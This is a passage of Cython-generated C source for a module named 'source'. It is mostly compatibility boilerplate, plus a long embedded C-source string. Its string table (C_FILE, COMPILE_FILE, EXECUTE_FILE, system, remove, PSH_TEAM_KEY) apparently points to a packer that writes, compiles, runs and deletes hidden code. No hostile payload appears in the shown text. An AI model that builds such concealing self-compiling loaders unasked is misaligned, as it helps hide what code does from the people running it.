static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_f[] = "f";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_RUN[] = "RUN";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_enter[] = "__enter__";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_write[] = "write";
static const char __pyx_k_C_FILE[] = "C_FILE";
static const char __pyx_k_PREFIX[] = "PREFIX";
static const char __pyx_k_exit_2[] = "__exit__";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_isfile[] = "isfile";
static const char __pyx_k_prefix[] = "prefix";
static const char __pyx_k_remove[] = "remove";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_dirname[] = "dirname";
static const char __pyx_k_version[] = "version";
static const char __pyx_k_C_SOURCE[] = "C_SOURCE";
static const char __pyx_k_exist_ok[] = "exist_ok";
static const char __pyx_k_makedirs[] = "makedirs";
static const char __pyx_k_executable[] = "executable";
static const char __pyx_k_COMPILE_FILE[] = "COMPILE_FILE";
static const char __pyx_k_EXECUTE_FILE[] = "EXECUTE_FILE";
static const char __pyx_k_PSH_TEAM_KEY[] = "PSH_TEAM_KEY";
static const char __pyx_k_PYTHON_VERSION[] = "PYTHON_VERSION";
static const char __pyx_k_EXPORT_PYTHONHOME[] = "EXPORT_PYTHONHOME";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_EXPORT_PYTHON_EXECUTABLE[] = "EXPORT_PYTHON_EXECUTABLE";
static const char __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define[] = "#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#include \"Python.h\"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.6+ or Python 3.3+.\n#else\n#define CYTHON_ABI \"0_29_33\"\n#define CYTHON_HEX_VERSION 0x001D21F0\n#define CYTHON_FUTURE_DIVISION 1\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #if PY_VERSION_HEX >= 0x02070000\n    #define HAVE_LONG_LONG\n  #endif\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#ifdef PYPY_VERSION\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE""_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYSTON_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON""_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #e""ndif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #if PY_MAJOR_VERSION < 3\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #if PY_VERSION_HEX < 0x02070000\n    #undef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #if PY_VERSION_HEX >= 0x030B00A4\n    #undef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 0\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\n  #endif\n  #ifndef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\n  #endif\n  #if PY_VERSION_HEX >= 0x030B0""0A4\n    #undef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 0\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n#endif\n#if !defined(CYTHON_FAST_PYCCALL)\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\n#endif\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_MAJOR_VERSION < 3\n    #include \"longintrepr.h\"\n  #endif\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#define __Pyx_void""_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n           typedef unsigned char     uint8_t;\n           typedef unsigned int      uint32_t;\n        #else\n           typedef unsigned __int8   uint8_t;\n           typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n#else\n   #include <stdint.h>\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus) && __cplusplus >= 201103L\n    #if __has_cpp_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH [[fallthrough]]\n    #elif __has_cpp_attribute(clang::fallthrough)\n      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n    #elif __has_cpp_attribute(gnu::fallthrough)\n      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__ ) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  #elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)\n  #define Py_OptimizeFlag 0\n#endif\n#define __PYX_BUILD_PY_SSIZE_T \"n\"\n#define CYTHON_FORMAT_SSIZE_T \"z\"\n#if PY_MAJOR_VERSION < 3\n  #define __Pyx_BUILTIN_MODULE_NAME \"__builtin__\"\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, ln""os)\\\n          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n  #define __Pyx_DefaultClassType PyClass_Type\n#else\n  #define __Pyx_BUILTIN_MODULE_NAME \"builtins\"\n  #define __Pyx_DefaultClassType PyType_Type\n#if PY_VERSION_HEX >= 0x030B00A1\n    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,\n                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,\n                                                    PyObject *fv, PyObject *cell, PyObject* fn,\n                                                    PyObject *name, int fline, PyObject *lnos) {\n        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;\n        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;\n        const char *fn_cstr=NULL;\n        const char *name_cstr=NULL;\n        PyCodeObject* co=NULL;\n        PyObject *type, *value, *traceback;\n        PyErr_Fetch(&type, &value, &traceback);\n        if (!(kwds=PyDict_New())) goto end;\n        if (!(argcount=PyLong_FromLong(a))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_argcount\", argcount) != 0) goto end;\n        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_posonlyargcount\", posonlyargcount) != 0) goto end;\n        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_kwonlyargcount\", kwonlyargcount) != 0) goto end;\n        if (!(nlocals=PyLong_FromLong(l))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_nlocals\", nlocals) != 0) goto end;\n        if (!(stacksize=PyLong_FromLong(s))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_stacksize\", stacksize) != 0) goto end;\n        if (!(flags=PyLong_FromLong(f))) goto end;\n        if (PyDict_SetItemString(kwds, \"co_flags\", flags) != 0) goto end;\n        if (PyDict_SetItemSt""ring(kwds, \"co_code\", code) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_consts\", c) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_names\", n) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_varnames\", v) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_freevars\", fv) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_cellvars\", cell) != 0) goto end;\n        if (PyDict_SetItemString(kwds, \"co_linetable\", lnos) != 0) goto end;\n        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;\n        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;\n        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;\n        if (!(replace = PyObject_GetAttrString((PyObject*)co, \"replace\"))) goto cleanup_code_too;\n        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here\n        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;\n        Py_XDECREF((PyObject*)co);\n        co = (PyCodeObject*)call_result;\n        call_result = NULL;\n        if (0) {\n            cleanup_code_too:\n            Py_XDECREF((PyObject*)co);\n            co = NULL;\n        }\n        end:\n        Py_XDECREF(kwds);\n        Py_XDECREF(argcount);\n        Py_XDECREF(posonlyargcount);\n        Py_XDECREF(kwonlyargcount);\n        Py_XDECREF(nlocals);\n        Py_XDECREF(stacksize);\n        Py_XDECREF(replace);\n        Py_XDECREF(call_result);\n        Py_XDECREF(empty);\n        if (type) {\n            PyErr_Restore(type, value, traceback);\n        }\n        return co;\n    }\n#else\n  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\\\n          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\n#endif\n  #define __Pyx_DefaultClassType PyType_Type\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#if""ndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n#endif\n#if CYTHON_FAST_PYCCALL\n#define __Pyx_PyFastCFunction_Check(func)\\\n    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))\n#else\n#define __Pyx_PyFastCFunction_Check(func) 0\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1\n  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)\n  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)\n  #define PyMem_RawFree(p)             PyMem_Free(p)\n#endif\n#if CYTHON_COMPILING_IN_PYSTON\n  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if !CYTHON_FAST_THREAD_STATE || PY_VER""SION_HEX < 0x02070000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x03060000\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#elif PY_VERSION_HEX >= 0x03000000\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_Current\n#endif\n#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)\n#include \"pythread.h\"\n#define Py_tss_NEEDS_INIT 0\ntypedef int Py_tss_t;\nstatic CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {\n  *key = PyThread_create_key();\n  return 0;\n}\nstatic CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {\n  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));\n  *key = Py_tss_NEEDS_INIT;\n  return key;\n}\nstatic CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {\n  PyObject_Free(key);\n}\nstatic CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {\n  return *key != Py_tss_NEEDS_INIT;\n}\nstatic CYTHON_INLINE void 